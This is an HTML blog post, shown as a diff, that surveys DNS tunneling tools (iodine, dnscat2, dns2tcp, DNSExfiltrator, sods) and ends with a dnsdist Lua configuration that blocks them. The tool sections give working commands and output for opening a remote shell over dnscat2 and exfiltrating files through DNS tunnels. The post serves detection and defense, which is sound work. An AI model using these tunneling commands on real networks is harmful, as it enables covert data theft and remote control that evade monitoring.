@@ -1,0 +1,242 @@
+<!doctype html><html dir=ltr lang=en data-theme><head><title>Denis MACHARD
+|
+DNS Tunneling: tools overview and dnsdist rules to block them</title><meta charset=utf-8><meta name=generator content="Hugo 0.115.2"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=description content="
+      Infrastructure architect by profession but always consider himself as a developer and an open source enthusiast.
+
+
+    "><link rel=stylesheet href=/css/main.min.a956a7860fcf75291ef2e359251769d8df586ea2fb01de06445ab2d52b512e04.css integrity="sha256-qVanhg/PdSke8uNZJRdp2N9YbqL7Ad4GRFqy1StRLgQ=" crossorigin=anonymous type=text/css><link rel=stylesheet href=/css/markupHighlight.min.058b31f17db60602cc415fd63b0427e7932fbf35c70d8e341a4c39385f5f6f3e.css integrity="sha256-BYsx8X22BgLMQV/WOwQn55MvvzXHDY40Gkw5OF9fbz4=" crossorigin=anonymous type=text/css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin=anonymous><link rel="shortcut icon" href=/favicon.ico type=image/x-icon><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=canonical href=/posts/0047-dns-tunneling/><script type=text/javascript src=/js/anatole-header.min.d0408165d31a17f17bba83038bf54e86121f85021bdf936382e636f0f77a952f.js integrity="sha256-0ECBZdMaF/F7uoMDi/VOhhIfhQIb35NjguY28Pd6lS8=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/anatole-theme-switcher.min.ea8ebe268922ef9849261a1312cd65b640595e65251ce4c00534a176afd1ac0c.js integrity="sha256-6o6+Joki75hJJhoTEs1ltkBZXmUlHOTABTShdq/RrAw=" crossorigin=anonymous></script><meta name=twitter:card content="summary"><meta name=twitter:title content="DNS Tunneling: tools overview and dnsdist rules to block them"><meta name=twitter:description content="This post is an overview of some dns tunnneling tools with installation procedure."><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","articleSection":"posts","name":"DNS Tunneling: tools overview and dnsdist rules to block them","headline":"DNS Tunneling: tools overview and dnsdist rules to block them","alternativeHeadline":"","description":"
+      
+        This post is an overview of some dns tunnneling tools with installation procedure.
+
+
+      
+
+
+    ","inLanguage":"en-us","isFamilyFriendly":"true","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/dmachard.github.io\/posts\/0047-dns-tunneling\/"},"author":{"@type":"Person","name":"Denis MACHARD"},"creator":{"@type":"Person","name":"Denis MACHARD"},"accountablePerson":{"@type":"Person","name":"Denis MACHARD"},"copyrightHolder":{"@type":"Person","name":"Denis MACHARD"},"copyrightYear":"2023","dateCreated":"2023-07-04T00:00:00.00Z","datePublished":"2023-07-04T00:00:00.00Z","dateModified":"2023-07-04T00:00:00.00Z","publisher":{"@type":"Organization","name":"Denis MACHARD","url":"https://dmachard.github.io/","logo":{"@type":"ImageObject","url":"https:\/\/dmachard.github.io\/favicon-32x32.png","width":"32","height":"32"}},"image":[],"url":"https:\/\/dmachard.github.io\/posts\/0047-dns-tunneling\/","wordCount":"1255","genre":[],"keywords":["powerdns","dnsdist","tunnel","dns"]}</script></head><body><header><div class="page-top
+."><a role=button class=navbar-burger data-target=navMenu aria-label=menu aria-expanded=false><span aria-hidden=true></span>
+<span aria-hidden=true></span>
+<span aria-hidden=true></span></a><nav><ul class=nav__list id=navMenu><div class=nav__links><li><a href=/ title>Home</a></li><li><a href=/posts title>Archive</a></li><li><a href=/tags title>Tags</a></li></div><ul><li><a class=theme-switch title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></li></ul></ul></nav></div></header><div class=wrapper><aside><div class="sidebar
+."><div class=sidebar__content><div class=logo-title><div class=title><img src=/images/profile.png alt="profile picture"><h3 title><a href=/>My technical gists</a></h3><div class=description><p>Infrastructure architect by profession but always consider himself as a developer and an open source enthusiast.</p></div></div></div><ul class=social-links><li><a href=https://dmachard.github.io/index.xml rel=me aria-label=e-mail><i class="fas fa-rss fa-2x" aria-hidden=true></i></a></li><li><a href=https://github.com/dmachard/ rel=me aria-label=GitHub><i class="fab fa-github fa-2x" aria-hidden=true></i></a></li><li><a href=https://twitter.com/denis_machard rel=me aria-label=Twitter><i class="fab fa-twitter fa-2x" aria-hidden=true></i></a></li><li><a href=https://www.linkedin.com/in/dmachard/ rel=me aria-label=Linkedin><i class="fab fa-linkedin fa-2x" aria-hidden=true></i></a></li><li><a href=mailto:d.machard@gmail.com rel=me aria-label=e-mail><i class="fas fa-envelope fa-2x" aria-hidden=true></i></a></li></ul></div><footer class="footer footer--sidebar"><div class=by_farbox><ul class=footer__list><li class=footer__item>&copy;
+Denis MACHARD
+2023</li></ul></div></footer><script type=text/javascript src=/js/medium-zoom.min.44288fd315b6cda68c1f4743caad56535c0f81a5b5a672f385e82b3896575c1d.js integrity="sha256-RCiP0xW2zaaMH0dDyq1WU1wPgaW1pnLzhegrOJZXXB0=" crossorigin=anonymous></script></div></aside><main><div class=autopagerize_page_element><div class=content><div class="post
+."><div class=post-content><div class=post-title><h1>DNS Tunneling: tools overview and dnsdist rules to block them</h1></div><p>This post is an overview of some dns tunnneling tools with installation procedure.
+A DNSdist configuration example is also provided to block them with dnsdist product.</p><h1 id=table-of-contents>Table of contents</h1><ul><li><a href=#what-is-dns-tunneling>What is DNS tunneling?</a></li><li><a href=#tools-overview>Tools overview</a><ul><li><a href=#iodine>iodine</a></li><li><a href=#dnscat2>dnscat2</a></li><li><a href=#dns2tcp>dns2tcp</a></li><li><a href=#DNSExfiltrator>DNSExfiltrator</a></li><li><a href=#sods>Sods</a></li><li><a href=#other-tools>Other tools</a></li></ul></li><li><a href=#dnsdist-blocking-configuration>DNSdist blocking configuration</a></li></ul><h2 id=what-is-dns-tunneling>What is DNS tunneling?</h2><p>DNS tunneling exploits DNS protocol for tunneling data via DNS query and response packet.
+It can be used to extract data silently from a corporate network.</p><h2 id=tools-overview>Tools overview</h2><h3 id=iodine>Iodine</h3><p>Tunnel IPv4 data over DNS</p><p>Github URL: <a href=https://github.com/yarrick/iodine>https://github.com/yarrick/iodine</a>
+Qtype DNS used: NULL, PRIVATE, MX, CNAME and TXT
+Network capture: <a href=https://github.com/dmachard/datasets-malicious-dns/blob/main/iodine.pcap>https://github.com/dmachard/datasets-malicious-dns/blob/main/iodine.pcap</a></p><p>Run server side</p><pre tabindex=0><code>sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --network=host -it dmachard/iodine:latest server -f 10.0.0.1 tun.example.com
+Enter tunnel password: 
+Opened dns0
+Setting IP of dns0 to 10.0.0.1
+Setting MTU of dns0 to 1130
+Opened IPv4 UDP socket
+Opened IPv6 UDP socket
+Listening to dns for domain tun.example.com
+</code></pre><p>Run client</p><pre tabindex=0><code>sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --network=host -it dmachard/iodine:latest client -f -r 8.8.8.8 tun.example.com
+Enter tunnel password: 
+Opened dns0
+Opened IPv4 UDP socket
+Sending DNS queries for tun.example.com to 8.8.8.8
+Autodetecting DNS query type (use -T to override).
+Using DNS type NULL queries
+Version ok, both using protocol v 0x00000502. You are user #0
+Setting IP of dns0 to 10.0.0.2
+Setting MTU of dns0 to 1130
+Server tunnel IP is 10.0.0.1
+Skipping raw mode
+Using EDNS0 extension
+Switching upstream to codec Base128
+Server switched upstream to codec Base128
+No alternative downstream codec available, using default (Raw)
+Switching to lazy mode for low-latency
+Server switched to lazy mode
+Autoprobing max downstream fragment size... (skip with -m fragsize)
+768 ok.. 1152 ok.. 1344 ok.. 1440 ok.. 1488 ok.. 1512 ok.. 1524 ok.. will use 1524-2=1522
+Setting downstream fragment size to max 1522...
+Connection setup complete, transmitting data.
+</code></pre><p>Upload a local file to remote side</p><pre tabindex=0><code>$ sudo scp /tmp/wireshark_wlp2s0IJSF71.pcapng root@10.0.0.1:/tmp
+The authenticity of host &#39;10.0.0.1 (10.0.0.1)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:n1Tj0bCqHpZswnjP92E33SoCQL4nj3pRKwS1qHB2RqY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.0.0.1&#39; (ED25519) to the list of known hosts.
+root@10.0.0.1&#39;s password: 
+wireshark_wlp2s0IJSF71.pcapng                   36% 3504KB 304.9KB/s   00:19 ETA
+</code></pre><h3 id=dnscat2>DNSCat2</h3><ul><li>Github URL: <a href=https://github.com/iagox86/dnscat2>https://github.com/iagox86/dnscat2</a></li><li>Qtype DNS used: TXT, CNAME, MX</li><li>Network capture: <a href=https://github.com/dmachard/datasets-malicious-dns/blob/main/dnscat2.pcap>https://github.com/dmachard/datasets-malicious-dns/blob/main/dnscat2.pcap</a></li></ul><p>Run server side</p><pre tabindex=0><code># sudo docker run -p 53:53/udp -it --rm dmachard/dnscat2:latest server biillpi.com
+
+New window created: 0
+New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach =&gt; false
+history_size (for new windows) =&gt; 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 0.0.0.0:53
+[domains = biillpi.com]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+  ./dnscat --secret=e9829a2263f0c5ca10c8024dd551691f biillpi.com
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=e9829a2263f0c5ca10c8024dd551691f
+
+Of course, you have to figure out &lt;server&gt; yourself! Clients
+will connect directly on UDP port 53.
+
+dnscat2&gt; 
+</code></pre><p>Run client</p><pre tabindex=0><code>$ sudo docker run -it --rm dmachard/dnscat2:latest client --secret=e9829a2263f0c5ca10c8024dd551691f biillpi.com
+Creating DNS driver:
+ domain = biillpi.com
+ host   = 0.0.0.0
+ port   = 53
+ type   = TXT,CNAME,MX
+ server = 192.168.1.210
+
+** Peer verified with pre-shared secret!
+
+Session established!
+</code></pre><p>Open a remote shell from server</p><pre tabindex=0><code>dnscat2&gt; session -i 2
+
+command (1535f3a093f8) 2&gt; shell
+Sent request to execute a shell
+command (1535f3a093f8) 2&gt; New window created: 3
+Shell session created!
+
+command (1535f3a093f8) 2&gt; session -i 3
+New window created: 3
+history_size (session) =&gt; 1000
+Session 3 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+This is a console session!
+
+That means that anything you type will be sent as-is to the
+client, and anything they type will be displayed as-is on the
+screen! If the client is executing a command and you don&#39;t
+see a prompt, try typing &#39;pwd&#39; or something!
+
+To go back, type ctrl-z.
+
+sh (1535f3a093f8) 3&gt; ls -alrt
+</code></pre><h3 id=dns2tcp>dns2tcp</h3><p>Github URL: <a href=https://github.com/alex-sector/dns2tcp>https://github.com/alex-sector/dns2tcp</a>
+Qtype DNS used: TXT, KEY
+Network capture: <a href=https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap>https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap</a></p><p>Compilation</p><pre tabindex=0><code>./configure
+make
+mkdir /var/empty/dns2tcp/
+</code></pre><p>Start server</p><pre tabindex=0><code>cd server
+
+cat &gt; ~/dns2tcpdrc &lt;&lt; EOF	
+listen = 0.0.0.0
+port = 5353
+user = nobody
+key = whateveryouwant
+chroot = /var/empty/dns2tcp/
+domain = dns2tcp.hsc.fr
+resources = ssh:127.0.0.1:22
+EOF
+
+./dns2tcpd -d 1 -f dns2tcpdrc -F 
+22:26:22 : Debug options.c:97	Add resource ssh:127.0.0.1 port 22
+22:26:22 : Debug socket.c:55	Listening on 0.0.0.0:5353 for domain dns2tcp.hsc.fr
+Starting Server v0.5.2...
+22:26:22 : Debug main.c:132	Chroot to /var/empty/dns2tcp/
+20:26:22 : Debug main.c:142	Change to user nobody
+</code></pre><p>Start client</p><pre tabindex=0><code>cd client
+
+cat &gt; ~/.dns2tcprc &lt;&lt; EOF
+domain = dns2tcp.hsc.fr
+resource = ssh
+local_port = 4430
+debug_level = 1
+key = whateveryouwant
+server = 192.168.1.210
+EOF
+
+./dns2tcpc -f dns2tcprc
+debug level 1
+Listening on port : 4430
+22:52:25 : Debug session.c:54	Session created (0xa4cf)
+22:52:25 : Debug auth.c:94	Connect to resource &#34;ssh&#34;
+22:52:25 : Debug client.c:141	Adding client auth OK: 0xa4cf
+22:52:54 : Debug requests.c:274	send desauth
+22:52:54 : Debug client.c:69	free client 
+</code></pre><p>Exfiltrate a file to remote</p><pre tabindex=0><code>scp -P 4430 /myfile.txt root@127.0.0.1:/tmp
+</code></pre><h3 id=dnsexfiltrator>DNSExfiltrator</h3><p>Github URL: <a href=https://github.com/Arno0x/DNSExfiltrator>https://github.com/Arno0x/DNSExfiltrator</a>
+Qtype DNS used: TXT
+Network capture: <a href=https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap>https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap</a></p><p>Start the server</p><pre tabindex=0><code># python2 dnsexfiltrator.py  -d hsc.fr -p password
+[*] DNS server listening on port 53
+[+] Decrypting using password [password] and saving to output file [Installer.exe.zip]
+[+] Output file [Installer.exe.zip] saved successfully
+</code></pre><p>Run client to exfiltrate a file</p><pre tabindex=0><code>C:\Users\&gt;dnsExfiltrator.exe Installer.exe hsc.fr password -b32 s=192.168.1.210
+[*] Working with DNS server [192.168.1.210]
+[*] Compressing (ZIP) the [Installer.exe] file in memory
+[*] Encrypting the ZIP file with password [password]
+[*] Encoding the data with Base32
+[*] Total size of data to be transmitted: [2757608] bytes
+[+] Maximum data exfiltrated per DNS request (chunk max size): [233] bytes
+[+] Number of chunks: [11836]
+[*] Sending &#39;init&#39; request
+[*] Sending data...
+[*] DONE !
+</code></pre><h3 id=sods>Sods</h3><p>Github URL: <a href=https://github.com/msantos/sods>https://github.com/msantos/sods</a>
+Qtype DNS used: TXT, CNAME and NULL
+Network capture: <a href=https://github.com/dmachard/datasets-malicious-dns/blob/main/sods.pcap>https://github.com/dmachard/datasets-malicious-dns/blob/main/sods.pcap</a></p><pre tabindex=0><code>sudo groupadd nogroup
+mkdir -p /var/chroot/sods
+
+server
+
+
+ ./sods -vvvv -L 127.0.0.1:22 -p 5353 hsc.fr
+Forwarded sessions = 1
+Forward #0: 127.0.0.1:22
+
+client
+
+sudo ./sdt -v -p 22 -r 192.168.1.210 tun.hsc.fr
+listening on port = 22
+session id = 22508, opt = 0, session = 0
+</code></pre><p>Make ssh from client to the remote server like this</p><pre tabindex=0><code>ssh root@localhost
+</code></pre><h3 id=other-tools>Other tools</h3><ul><li><a href=https://github.com/mdornseif/DeNiSe>https://github.com/mdornseif/DeNiSe</a></li><li><a href=https://code.google.com/archive/p/dnscapy/>https://code.google.com/archive/p/dnscapy/</a></li></ul><h2 id=dnsdist-blocking-approach>DNSdist blocking approach</h2><p>The approach:</p><ul><li>Uncommon DNS Qtype like NULL, PRIVATE are blocked</li><li>A generic regex to block long successive DNS label with whitelist to avoid false-positive</li><li>Then finally apply some rate limitation per IP</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>-- Generic rules to block malicious dns traffic with regex</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- remote dnstap logger</span>
+</span></span><span style=display:flex><span>security_dnstap_logger <span style=color:#f92672>=</span> newFrameStreamTcpLogger(<span style=color:#e6db74>&#34;10.0.0.100:6000&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- white list to ignore some trusted domains</span>
+</span></span><span style=display:flex><span>malicious_white_list <span style=color:#f92672>=</span> newSuffixMatchNode()
+</span></span><span style=display:flex><span>malicious_white_list:add(newDNSName(<span style=color:#e6db74>&#34;google.fr&#34;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- match uncommon qtype like NULL (10), PRIVATE (65399) - works fine to block iodine</span>
+</span></span><span style=display:flex><span>addAction(AndRule({OrRule({QTypeRule(<span style=color:#ae81ff>10</span>), QTypeRule(<span style=color:#ae81ff>65399</span>)}), NotRule(SuffixMatchNodeRule(malicious_white_list, <span style=color:#66d9ef>true</span>)) }), SetTagAction(<span style=color:#e6db74>&#39;block_malicious&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- match long qname - 2 labels with a minimum of 50 bytes each - works fine to block tools like iodine, dnscat2, dns2tcp...</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- to avoid false-positive. The regex has been tested on the top 1 million list exposed by Cisco Umbrella http://s3-us-west-1.amazonaws.com/umbrella-static/top-1m.csv.zip</span>
+</span></span><span style=display:flex><span>addAction(AndRule({RegexRule(<span style=color:#e6db74>&#39;([^.]{50,}</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>.){2,}&#39;</span>), NotRule(SuffixMatchNodeRule(malicious_white_list, <span style=color:#66d9ef>true</span>)) }), SetTagAction(<span style=color:#e6db74>&#39;block_malicious&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- logging malicious queries on remote dnstap logger</span>
+</span></span><span style=display:flex><span>addAction(TagRule(<span style=color:#e6db74>&#39;block_malicious&#39;</span>), DnstapLogAction(<span style=color:#e6db74>&#34;malicious_blocked&#34;</span>, security_dnstap_logger))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- finally refused malicious queries</span>
+</span></span><span style=display:flex><span>addAction(TagRule(<span style=color:#e6db74>&#39;block_malicious&#39;</span>), RCodeAction(DNSRCode.REFUSED))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- Update the dynamic blocks with refused reply by default</span>
+</span></span><span style=display:flex><span>setDynBlocksAction(DNSAction.Refused)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- Rate exceeded detection with automatic ip blacklisting during 60s</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>--  * max 5req/s during 5s for TXT, CNAME and MX</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>--  * max bw to 1000bytes/s during 5s</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>local</span> dbr <span style=color:#f92672>=</span> dynBlockRulesGroup()
+</span></span><span style=display:flex><span>dbr:setQTypeRate(DNSQType.TXT, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>, <span style=color:#e6db74>&#34;Exceeded TXT rate&#34;</span>, <span style=color:#ae81ff>60</span>)
+</span></span><span style=display:flex><span>dbr:setQTypeRate(DNSQType.CNAME, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>, <span style=color:#e6db74>&#34;Exceeded CNAME rate&#34;</span>, <span style=color:#ae81ff>60</span>)
+</span></span><span style=display:flex><span>dbr:setQTypeRate(DNSQType.MX, <span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>, <span style=color:#e6db74>&#34;Exceeded MX rate&#34;</span>, <span style=color:#ae81ff>60</span>)
+</span></span><span style=display:flex><span>dbr:setResponseByteRate(<span style=color:#ae81ff>1000</span>, <span style=color:#ae81ff>5</span>, <span style=color:#e6db74>&#34;Exceeded resp BW rate&#34;</span>, <span style=color:#ae81ff>60</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>-- check dynamic rule every second</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>maintenance</span>()
+</span></span><span style=display:flex><span>  dbr:apply()
+</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
+</span></span></code></pre></div><p>This configuration can be downloaded here <a href=https://github.com/dmachard/lua-dnsdist-config-examples/blob/main/security_blocking_dnstunneling.lua>https://github.com/dmachard/lua-dnsdist-config-examples/blob/main/security_blocking_dnstunneling.lua</a></p></div><div class=post-footer><div class=info><span class=separator><a class=tag href=/tags/powerdns/>powerdns</a><a class=tag href=/tags/dnsdist/>dnsdist</a><a class=tag href=/tags/tunnel/>tunnel</a><a class=tag href=/tags/dns/>dns</a></span></div></div></div></div></div></main></div><footer class="footer footer--base"><div class=by_farbox><ul class=footer__list><li class=footer__item>&copy;
+Denis MACHARD
+2023</li></ul></div></footer><script type=text/javascript src=/js/medium-zoom.min.44288fd315b6cda68c1f4743caad56535c0f81a5b5a672f385e82b3896575c1d.js integrity="sha256-RCiP0xW2zaaMH0dDyq1WU1wPgaW1pnLzhegrOJZXXB0=" crossorigin=anonymous></script></body></html>
